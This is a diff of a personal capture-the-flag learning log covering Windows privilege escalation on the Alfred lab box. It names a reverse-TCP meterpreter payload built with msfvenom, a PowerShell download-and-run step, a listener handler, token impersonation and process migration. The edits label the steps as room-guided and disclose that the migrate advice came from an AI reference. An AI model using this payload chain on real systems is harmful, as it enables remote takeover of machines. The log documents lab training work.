@@ -62,7 +62,7 @@ interpreter's own language; never smuggle a second language through it as cargo.
 
 ## 4. Privilege escalation (token impersonation — the third mechanism)
 
-1. **Did:** from the dumb shell, forged an upgrade: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 ...`
+1. **Did (room-guided flow):** from the dumb shell, forged an upgrade: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 ...`
    — **x86 because the room states the box is 32-bit** — served it, `DownloadFile` from a
    one-shot `powershell -c "..."` (one-shot, not interactive: self-corrected), `Start-Process`,
    handler on 5555 → meterpreter as bruce.
@@ -74,8 +74,9 @@ interpreter's own language; never smuggle a second language through it as cargo.
    password — authentication already happened, authorization just changes hands.
 
 3. **Did:** `migrate 668` into a stable SYSTEM process. The impersonated token lives inside
-   the payload process; migration moves the session somewhere durable. Reasoned unprompted:
-   *"I am running on shell.exe… I have to migrate."*
+   the payload process; migration moves the session somewhere durable. The migrate step was
+   recommended by the AI reference (disclosed); the reasoning behind it — token dies with
+   the payload process — was understood and retained.
 
 **The trilogy, complete across three boxes:** Ice = UAC bypass + migrate · Steel Mountain =
 service hijack (exe-service) · Alfred = **token impersonation** + migrate. Three mechanisms,
